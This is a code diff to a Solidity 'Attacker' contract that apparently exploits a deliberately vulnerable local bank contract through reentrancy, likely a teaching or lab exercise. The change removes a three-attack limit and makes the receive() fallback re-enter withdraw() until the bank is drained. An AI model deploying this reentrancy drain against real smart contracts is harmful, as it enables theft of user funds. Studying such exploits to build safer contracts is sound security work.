@@ -6,7 +6,6 @@ import "./VulnerableBank.sol";
 contract Attacker {
     VulnerableBank public vulnerableBank;
     uint256 public attackCount;
-    uint256 public constant MAX_ATTACKS = 3;
 
     constructor(address _bankAddress) {
         vulnerableBank = VulnerableBank(_bankAddress);
@@ -19,14 +18,15 @@ contract Attacker {
         vulnerableBank.withdraw();
     }
 
-    // step 2: re-entry point — called every time bank sends ETH
+    // // Re-enter the vulnerable contract until all available Ether is drained
     receive() external payable {
-        attackCount++;
-        if (attackCount < MAX_ATTACKS &&
-            address(vulnerableBank).balance >= 1 ether) {
-            vulnerableBank.withdraw();
-        }
+    uint256 contractBalance = address(vulnerableBank).balance;
+    uint256 myRecordedBalance = vulnerableBank.balances(address(this));
+
+    if (contractBalance > 0 && myRecordedBalance > 0) {
+        vulnerableBank.withdraw();
     }
+}
 
     function getBalance() public view returns (uint256) {
         return address(this).balance;
